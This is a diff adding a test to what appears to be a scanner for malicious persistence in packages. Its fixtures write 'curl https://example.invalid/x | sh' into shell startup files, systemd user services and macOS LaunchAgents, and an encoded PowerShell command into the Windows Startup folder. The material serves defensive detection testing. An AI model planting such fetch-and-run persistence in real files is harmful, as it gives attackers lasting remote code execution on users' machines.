@@ -156,6 +156,52 @@ winreg.SetValueEx(key, 'Updater', 0, winreg.REG_SZ, r'C:\\Temp\\worker.exe')
     }
 
 
+def test_absolute_user_home_persistence_paths_across_platforms(make_package):
+    files = {
+        "linux_rc.py": """\
+from pathlib import Path
+Path('/home/alice/.bashrc').write_text('curl https://example.invalid/x | sh')
+""",
+        "root_systemd.py": """\
+from pathlib import Path
+Path('/root/.config/systemd/user/update.service').write_text(
+    '[Service]\\nExecStart=/bin/sh -c "curl https://example.invalid/x | sh"')
+""",
+        "mac_launchd.py": """\
+from pathlib import Path
+Path('/Users/alice/Library/LaunchAgents/com.demo.update.plist').write_text(
+    '<key>ProgramArguments</key><string>curl https://example.invalid/x | sh</string>')
+""",
+        "windows_startup.py": (
+            "from pathlib import Path\n"
+            "Path(r'C:\\Users\\Alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\"
+            "Programs\\Startup\\update.cmd').write_text('powershell -enc AAAA')\n"
+        ),
+        "linux_rc.sh": "echo 'curl https://example.invalid/x | sh' >> /home/alice/.zshrc\n",
+        "mac_launchd.sh": (
+            "printf '%s' '<key>ProgramArguments</key><string>curl "
+            "https://example.invalid/x | sh</string>' > "
+            "/Users/alice/Library/LaunchAgents/com.demo.update.plist\n"
+        ),
+        "root_systemd.sh": (
+            "printf '%b' '[Service]\\nExecStart=curl https://example.invalid/x | sh' "
+            "> /root/.config/systemd/user/update.service\n"
+        ),
+        "lookalike.py": """\
+from pathlib import Path
+Path('/tmp/home/alice/.bashrc').write_text('curl https://example.invalid/x | sh')
+""",
+        "lookalike.sh": "echo 'curl https://example.invalid/x | sh' >> /tmp/home/alice/.zshrc\n",
+    }
+
+    findings = _opengrep(make_package, files)
+
+    assert {finding.path for finding in findings} == {
+        "linux_rc.py", "linux_rc.sh", "mac_launchd.py", "mac_launchd.sh",
+        "root_systemd.py", "root_systemd.sh", "windows_startup.py",
+    }
+
+
 def test_reassigned_persistence_targets_do_not_report(make_package):
     files = {
         "rc.py": """\
